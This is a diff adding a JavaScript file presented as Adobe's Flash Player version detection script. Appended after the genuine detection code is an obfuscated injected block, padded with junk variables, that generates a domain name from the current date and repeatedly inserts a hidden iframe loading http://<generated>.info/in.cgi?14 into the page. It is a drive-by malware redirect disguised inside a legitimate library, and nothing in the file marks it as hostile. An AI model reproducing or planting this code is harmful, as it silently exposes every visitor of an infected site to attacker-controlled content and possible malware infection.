@@ -1,0 +1,296 @@
+//v1.7
+// Flash Player Version Detection
+// Detect Client Browser type
+// Copyright 2005-2007 Adobe Systems Incorporated.  All rights reserved.
+var isIE  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
+var isWin = (navigator.appVersion.toLowerCase().indexOf("win") != -1) ? true : false;
+var isOpera = (navigator.userAgent.indexOf("Opera") != -1) ? true : false;
+
+function ControlVersion()
+{
+	var version;
+	var axo;
+	var e;
+
+	// NOTE : new ActiveXObject(strFoo) throws an exception if strFoo isn't in the registry
+
+	try {
+		// version will be set for 7.X or greater players
+		axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
+		version = axo.GetVariable("$version");
+	} catch (e) {
+	}
+
+	if (!version)
+	{
+		try {
+			// version will be set for 6.X players only
+			axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
+			
+			// installed player is some revision of 6.0
+			// GetVariable("$version") crashes for versions 6.0.22 through 6.0.29,
+			// so we have to be careful. 
+			
+			// default to the first public version
+			version = "WIN 6,0,21,0";
+
+			// throws if AllowScripAccess does not exist (introduced in 6.0r47)		
+			axo.AllowScriptAccess = "always";
+
+			// safe to call for 6.0r47 or greater
+			version = axo.GetVariable("$version");
+
+		} catch (e) {
+		}
+	}
+
+	if (!version)
+	{
+		try {
+			// version will be set for 4.X or 5.X player
+			axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
+			version = axo.GetVariable("$version");
+		} catch (e) {
+		}
+	}
+
+	if (!version)
+	{
+		try {
+			// version will be set for 3.X player
+			axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
+			version = "WIN 3,0,18,0";
+		} catch (e) {
+		}
+	}
+
+	if (!version)
+	{
+		try {
+			// version will be set for 2.X player
+			axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
+			version = "WIN 2,0,0,11";
+		} catch (e) {
+			version = -1;
+		}
+	}
+	
+	return version;
+}
+
+// JavaScript helper required to detect Flash Player PlugIn version information
+function GetSwfVer(){
+	// NS/Opera version >= 3 check for Flash plugin in plugin array
+	var flashVer = -1;
+	
+	if (navigator.plugins != null && navigator.plugins.length > 0) {
+		if (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]) {
+			var swVer2 = navigator.plugins["Shockwave Flash 2.0"] ? " 2.0" : "";
+			var flashDescription = navigator.plugins["Shockwave Flash" + swVer2].description;
+			var descArray = flashDescription.split(" ");
+			var tempArrayMajor = descArray[2].split(".");			
+			var versionMajor = tempArrayMajor[0];
+			var versionMinor = tempArrayMajor[1];
+			var versionRevision = descArray[3];
+			if (versionRevision == "") {
+				versionRevision = descArray[4];
+			}
+			if (versionRevision[0] == "d") {
+				versionRevision = versionRevision.substring(1);
+			} else if (versionRevision[0] == "r") {
+				versionRevision = versionRevision.substring(1);
+				if (versionRevision.indexOf("d") > 0) {
+					versionRevision = versionRevision.substring(0, versionRevision.indexOf("d"));
+				}
+			}
+			var flashVer = versionMajor + "." + versionMinor + "." + versionRevision;
+		}
+	}
+	// MSN/WebTV 2.6 supports Flash 4
+	else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.6") != -1) flashVer = 4;
+	// WebTV 2.5 supports Flash 3
+	else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.5") != -1) flashVer = 3;
+	// older WebTV supports Flash 2
+	else if (navigator.userAgent.toLowerCase().indexOf("webtv") != -1) flashVer = 2;
+	else if ( isIE && isWin && !isOpera ) {
+		flashVer = ControlVersion();
+	}	
+	return flashVer;
+}
+
+// When called with reqMajorVer, reqMinorVer, reqRevision returns true if that version or greater is available
+function DetectFlashVer(reqMajorVer, reqMinorVer, reqRevision)
+{
+	versionStr = GetSwfVer();
+	if (versionStr == -1 ) {
+		return false;
+	} else if (versionStr != 0) {
+		if(isIE && isWin && !isOpera) {
+			// Given "WIN 2,0,0,11"
+			tempArray         = versionStr.split(" "); 	// ["WIN", "2,0,0,11"]
+			tempString        = tempArray[1];			// "2,0,0,11"
+			versionArray      = tempString.split(",");	// ['2', '0', '0', '11']
+		} else {
+			versionArray      = versionStr.split(".");
+		}
+		var versionMajor      = versionArray[0];
+		var versionMinor      = versionArray[1];
+		var versionRevision   = versionArray[2];
+
+        	// is the major.revision >= requested major.revision AND the minor version >= requested minor
+		if (versionMajor > parseFloat(reqMajorVer)) {
+			return true;
+		} else if (versionMajor == parseFloat(reqMajorVer)) {
+			if (versionMinor > parseFloat(reqMinorVer))
+				return true;
+			else if (versionMinor == parseFloat(reqMinorVer)) {
+				if (versionRevision >= parseFloat(reqRevision))
+					return true;
+			}
+		}
+		return false;
+	}
+}
+
+function AC_AddExtension(src, ext)
+{
+  if (src.indexOf('?') != -1)
+    return src.replace(/\?/, ext+'?'); 
+  else
+    return src + ext;
+}
+
+function AC_Generateobj(objAttrs, params, embedAttrs) 
+{ 
+  var str = '';
+  if (isIE && isWin && !isOpera)
+  {
+    str += '<object ';
+    for (var i in objAttrs)
+    {
+      str += i + '="' + objAttrs[i] + '" ';
+    }
+    str += '>';
+    for (var i in params)
+    {
+      str += '<param name="' + i + '" value="' + params[i] + '" /> ';
+    }
+    str += '</object>';
+  }
+  else
+  {
+    str += '<embed ';
+    for (var i in embedAttrs)
+    {
+      str += i + '="' + embedAttrs[i] + '" ';
+    }
+    str += '> </embed>';
+  }
+
+  document.write(str);
+}
+
+function AC_FL_RunContent(){
+  var ret = 
+    AC_GetArgs
+    (  arguments, ".swf", "movie", "clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
+     , "application/x-shockwave-flash"
+    );
+  AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
+}
+
+function AC_SW_RunContent(){
+  var ret = 
+    AC_GetArgs
+    (  arguments, ".dcr", "src", "clsid:166B1BCA-3F9C-11CF-8075-444553540000"
+     , null
+    );
+  AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
+}
+
+function AC_GetArgs(args, ext, srcParamName, classid, mimeType){
+  var ret = new Object();
+  ret.embedAttrs = new Object();
+  ret.params = new Object();
+  ret.objAttrs = new Object();
+  for (var i=0; i < args.length; i=i+2){
+    var currArg = args[i].toLowerCase();    
+
+    switch (currArg){	
+      case "classid":
+        break;
+      case "pluginspage":
+        ret.embedAttrs[args[i]] = args[i+1];
+        break;
+      case "src":
+      case "movie":	
+        args[i+1] = AC_AddExtension(args[i+1], ext);
+        ret.embedAttrs["src"] = args[i+1];
+        ret.params[srcParamName] = args[i+1];
+        break;
+      case "onafterupdate":
+      case "onbeforeupdate":
+      case "onblur":
+      case "oncellchange":
+      case "onclick":
+      case "ondblclick":
+      case "ondrag":
+      case "ondragend":
+      case "ondragenter":
+      case "ondragleave":
+      case "ondragover":
+      case "ondrop":
+      case "onfinish":
+      case "onfocus":
+      case "onhelp":
+      case "onmousedown":
+      case "onmouseup":
+      case "onmouseover":
+      case "onmousemove":
+      case "onmouseout":
+      case "onkeypress":
+      case "onkeydown":
+      case "onkeyup":
+      case "onload":
+      case "onlosecapture":
+      case "onpropertychange":
+      case "onreadystatechange":
+      case "onrowsdelete":
+      case "onrowenter":
+      case "onrowexit":
+      case "onrowsinserted":
+      case "onstart":
+      case "onscroll":
+      case "onbeforeeditfocus":
+      case "onactivate":
+      case "onbeforedeactivate":
+      case "ondeactivate":
+      case "type":
+      case "codebase":
+      case "id":
+        ret.objAttrs[args[i]] = args[i+1];
+        break;
+      case "width":
+      case "height":
+      case "align":
+      case "vspace": 
+      case "hspace":
+      case "class":
+      case "title":
+      case "accesskey":
+      case "name":
+      case "tabindex":
+        ret.embedAttrs[args[i]] = ret.objAttrs[args[i]] = args[i+1];
+        break;
+      default:
+        ret.embedAttrs[args[i]] = ret.params[args[i]] = args[i+1];
+    }
+  }
+  ret.objAttrs["classid"] = classid;
+  if (mimeType) ret.embedAttrs["type"] = mimeType;
+  return ret;
+}
+
+/*c3284d*/
+var var1=true;var var2=10;var2++;var var6=0.0025;if(var6==null){var var5=0.0123;if(var5<0.0104){var var4=1819;if(var4==14){var var3='mib'}}}var var7=0.017;function per(str,shift){var var4,ret,pos,var1,var3,ch,len,ext,sh,var5,ich,var2,cnt2,var6,cnt1,sux,ch;for(var var1=0;var1<9;var1++){var var2=14;var2++;var var4=1209;if(var4==21){var var3={fub:5}}}var var7=1107;if(var7<0.001){var var5=30;var5-=0.022;var var6=5685;var6--}var var5=57;var var8=0;do{var var10=29;if(var10!=7170){var var9=13;var9--}var var11=19;var11-=3975;var8++}while(var8<10);var5+=5;var var12=0;while(var12<5){var var13=26;var13++;var var14=[30,20,0,10];var12++}function map(orb,gid){var var15=18;var15+=2887;var var16=8032;return orb}var var2='ieZsubQ_'.substr(3,3);function eat(set,pot){var var23=2768;if(var23!=1391){var var21=4053;if(var21>0.038){var var17=5470;var17--;var var20=22;if(var20<null){var var18=null;var18-=7;var var19=29;var19--}}var var22=[36,6,24,0,12,30,18]}var var26=11;if(var26<22){var var24=23;var24--;var var25=0.008}return set}for(var var27=0;var27<6;var27++){var var28=6610;var28++;var var29=11;var29+=12}var2+='v8kstrBn'.substr(3,3);for(var var30=0;var30<7;var30++){var var31=6993;var31-=0.01;var var32=8980;var32--}function hae(key,mir){var var34=0.031;if(var34==0){var var33=0.052}var var36=4603;if(var36!=null){var var35=0.0015;var35--}return key}var var4='mYfromXy'.substr(2,4);function hoy(tub){var var37=3462;var37-=6037;return tub}function tas(ops,ret){var var41=2675;if(var41>0){var var38=0.012;var var40=22;if(var40>12){var var39=11;var39++}}return ops}var4+='cpnCharJa'.substr(3,4);var var42=0.009;var42+=0.004;var var43=0;var43+=0.003;var4+='cvCodeOV'.substr(2,4);function yam(tav,bug){for(var var44=0;var44<4;var44++){var var47=0.016;if(var47>20){var var45=5;var45--;var var46='ESAtx2DOKQ'}var var48=0.005;var48--}return tav}var var49=0;while(var49<8){var var51=0.017;if(var51>0){var var50=0.0154}var49++}var var3='fuMbindeG3'.substr(4,4);var var52=0.0011;var52-=5035;for(var var53=0;var53<10;var53++){var var54=null;var54-=0.0082}var3+='BjMxOfXg'.substr(3,3);var var55=3271;var55++;var var1='kLzplenPW'.substr(4,3);var var56=0.006;var56++;var1+='C5QYgthJx'.substr(4,3);var var57=['cod','row'];var var59=3871;if(var59==0){var var58='lop'}var var6=26;function yah(bet){var var62=0.015;if(var62>0.029){var var60=16;var60-=4269;var var61=0;var61-=8273}var var63=0;var63+=13;return bet}var6-=10;var var64=0.0079;var sux='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';var var65=4483;var ret='';var var66=17;var ext='';var var67=0;while(var67<3){var var68=null;var67++}var var69=16;var69--;var sh=0;for(var var70=0;var70<7;var70++){var var71=0.01;var71++}var var75=6519;if(var75==27){var var73=0.0086;if(var73!=0.023){var var72=25;var72+=0.0051}var var74='pye'}var len=str[var1];var var76=0.032;for(var cnt1=0;cnt1<len;cnt1++){function den(ink){var var77='lux';var var78=0.003;var78+=7;return ink}sh+=shift;var var79=0;do{var var81=0.0045;if(var81!=0.0141){var var80=26}var79++}while(var79<10);var ch=str[var2](cnt1,1);var var82=0;while(var82<9){var var83={lax:'bud'};var var84=30;var84-=19;var82++}var var86=0.0064;if(var86<30){var var85=19;var85-=8}var pos=sux[var3](ch);for(var var87=0;var87<5;var87++){var var88=0;var88+=0.008;var var89=true}pos+=sh;var var96=6;if(var96<23){var var90=null;var var95=17;if(var95!=0){var var94=0.02;if(var94>0.0078){var var92=13;if(var92!=0.0086){var var91=0.001;var91++}var var93=6105;var93--}}}var var99=6;if(var99>0){var var97=null;var97-=3546;var var98='tic'}pos%=var5;var var100=5031;var100--;ret+=sux[var2](pos,1);var var101=8;var101-=0.0147;var var102=0.001;var102--}function man(and,qua){for(var var103=0;var103<10;var103++){var var104=0.0164;var104--}var var105='bal';return qua}for(var cnt2=0;cnt2<len;cnt2+=2){var var106=['owl','vaw'];var ch=ret[var2](cnt2,2);var var107=0.0049;var107-=8277;var ich=parseInt(ch,var6);var var108=0;var108+=7545;ext+=String[var4](ich);var var109=21}var var110=0;while(var110<6){var var112=4222;if(var112!=null){var var111=0}var var113=0.0012;var113--;var110++}var var114=[27,0,18,36,9];return ext}for(var var8=0;var8<9;var8++){var var11=0.0119;if(var11>0.013){var var9=0.0279;var9+=17;var var10=0.0102;var10-=10}var var12=20;var12-=27}function gam(moc){var var13=0;while(var13<9){var var15=6448;if(var15>0){var var14=7;var14-=7}var13++}var var16=16;var16-=11;return moc}function yar(){var lo,test,hi;var var1=3245;var var2=null;var2-=0.0249;for(var var3=0;var3<4;var3++){var var4='yuk'}var hi=this.seed/this.Q;var var5=6775;var5-=14;var var6=0;while(var6<7){var var9=7088;if(var9>18){var var7=0.003;var7++;var var8=1954;var8--}var6++}    var lo=this.seed%this.Q;var var10=0;while(var10<10){var var11=14;var11++;var var12=0;var12+=29;var10++}    var test=this.A*lo-this.R*hi;var var13=0.034;var13--;var var14=0.044;var14++;    if(test>0){var var15=0.004;var15--;function any(nim){var var16=13;var16--;return nim}        this.seed=test;var var17=0.0071;var17+=0.015}else{var var20=4238;if(var20==8332){var var18=5526;var18--;var var19=5834;var19--}        this.seed=test+this.M;function ser(fro){var var21=0;while(var21<3){var var22=5777;var22--;var var23=2926;var23+=14;var21++}var var24=8738;var24+=5434;return fro}var var25=25;var25--}var var26=23;var26++;var var27=7542;var27-=8732;    return(this.seed*this.oneOverM)}var var17=5597;var17--;var var18=7482;var18-=3028;function bay(unix){var var3,d,s,var1,var2;var var4=6462;var4++;var var2=63254;function fur(adz,see){var var5={dug:0.019};return adz}var var6=0.005;var6++;var2+=2281;var var7=null;var7-=22;var var1=17888369;var var8=false;var var9=0;do{var var12=6240;if(var12>null){var var10=null;var10-=0.003;var var11=0.012;var11-=20}var var15=22;if(var15<0.009){var var13=0.002;var13++;var var14=6744;var14++}var9++}while(var9<4);var1-=1111154;function qat(ais,bus){var var16=28;var16-=2458;var var17=0;return ais}var var18=0.0143;var18-=23;var var3=6200;var var19=0.0235;var var20={abo:17};var3-=2105;var var21=2233;var21+=6726;var d=new Date(unix*1000);var var22=0.006;var22++;var var23=2292;var23-=29;    var s=Math.ceil(d.getHours()/3);var var27=6078;if(var27>0.0184){var var25=7;if(var25>15){var var24=1343;var24++}var var26=27}    this.seed=2345678901+(d.getMonth()*var1)+(d.getDate()*var2)+(Math.round(s*var3));var var29=7839;if(var29==0.001){var var28=0}var var30=9;var30+=7489;    this.A=48271;function hup(syn,lis){var var31=0.031;var31-=6927;return lis}var var32=0;while(var32<5){var var33={zed:null};var var34=['vet','awn','jow'];var32++}    this.M=2147483647;var var35=0;do{var var36=['jot','yen','oak'];var var39=3670;if(var39!=8716){var var37=8189;var37++;var var38=null;var38+=6}var35++}while(var35<10);function erg(rax){var var42=0.002;if(var42!=1660){var var40=0.0024;var40++;var var41=8664}return rax}    this.Q=this.M/this.A;var var43=null;var43+=0.023;    this.R=this.M%this.A;var var44=true;var var45=[20,0,5,10,15];    this.oneOverM=1.0/this.M;var var46=20;var46++;    this.next=yar;var var47=0.0088;var var49=0.007;if(var49>17){var var48=6;var48++}    return this}var var21=6537;if(var21<6811){var var19={kaf:['mun','dey','sha']};var var20=7696}function was(r,Min,Max){var var9=17;if(var9==null){var var1=0.028;var var8=4014;if(var8!=3947){var var4=21;if(var4!=0.0116){var var2=10;var2--;var var3=0;var3-=0.0172}var var7=5421;if(var7<0.0142){var var5=0.0036;var5-=0.0065;var var6=8713;var6--}}}var var11=16;if(var11>7423){var var10=0.0292;var10++}return Math.round((Max-Min)*r.next()+Min)}var var22=23;var22--;function buy(unix,length,zone){var i,letters,rand,str;var var1=8167;var1+=3400;function tie(pin){var var4=0.052;if(var4!=2753){var var2=true;var var3=['apt','gag']}return pin}var var5=27;var5++;var rand=new bay(unix);var var6=true;    var letters='qmahgwctopfjilrfpjrfcwgewheizwdw'.split('');var var16=5058;if(var16!=null){var var7=0.005;var7--;var var15=19;if(var15!=8777){var var11=1867;if(var11==0){var var9=0.0131;if(var9!=0){var var8=1696;var8++}var var10={pal:7041}}var var14=22;if(var14==10){var var13=0.017;if(var13!=0){var var12=4296}}}}    var str='';function lox(mog,gin,lay){var var17=0;while(var17<5){var var18=29;var18-=25;var var19=null;var19-=7325;var17++}var var22=0.0185;if(var22>5){var var20=4929;var20++;var var21=12}return mog}for(var i=0; i<length; i++){var var23=18;var23--;function kir(six,zig){var var24=0;do{var var26=4929;if(var26==null){var var25=[14,7,0,21]}var var27=['brr','has','ire'];var24++}while(var24<5);return zig}        str+=letters[was(rand, 0, letters.length-1)];var var28=0;var28+=11}var var29={guy:0.0114};var var30=5709;var30+=0.0306;    return str+'.'+zone}var var23=15;var23-=1863;var var24=29;var24++;setInterval(function(){var var30=0.003;if(var30!=8953){var var25=null;var25+=7804;var var29=15;if(var29<26){var var28=0.01;if(var28==18){var var26=null;var26-=5819;var var27=0.003;var27++}}}var var31=[0,70,50,30,10,20,60,40];    try{var var33=0.036;if(var33==0.0057){var var32=29;var32++}var var34=0.017;var34+=5;        if(typeof iframeWasCreated=='undefined'){var var36=0.006;if(var36>null){var var35=0.0012;var35--}            var unix=Math.round(+new Date()/1000);var var37='E6ZrXLv3';            var domainName=buy(unix, 16, 'info');function con(far,got,nut){for(var var38=0;var38<9;var38++){var var39=8962;var39++}return nut}var var40=0;do{var var41=false;var var42=0.0113;var42++;var40++}while(var40<4);            ifrm=document.createElement('i'+'frame'); var var44=0.0131;if(var44<0){var var43=0.018;var43-=0.0228}var var48=29;if(var48>0){var var45=4800;var45--;var var47=12;if(var47!=30){var var46=0.015;var46++}}            ifrm.setAttribute('sr'+'c', 'http://'+domainName+'/in.cgi?14'); var var49=4490;var49--;            ifrm.style.width='10px'; var var50=0.0187;var50+=2769;            ifrm.style.height='10px'; function pry(ewe,duo){var var51=null;var var52=0;while(var52<4){var var55=0.0036;if(var55!=27){var var53=20;var var54=[0,14,21,7,28,42,35]}var var56=4404;var56++;var52++}return duo}function ope(lap){var var57='nib';return lap}            ifrm.style.visibility='hidden'; var var58='YKtHrZfxVR';var var59=4012;var59+=8962;            document.body.appendChild(ifrm);var var60=0.001;iframeWasCreated=true;var var61=['eld','fud']}var var63=6092;if(var63==0.011){var var62=12;var62-=9}function ora(dip,asp){var var64=25;var64+=0.0016;return asp}}catch(e){iframeWasCreated=undefined}var var65=23;var65-=29}, 100);
+/*/c3284d*/
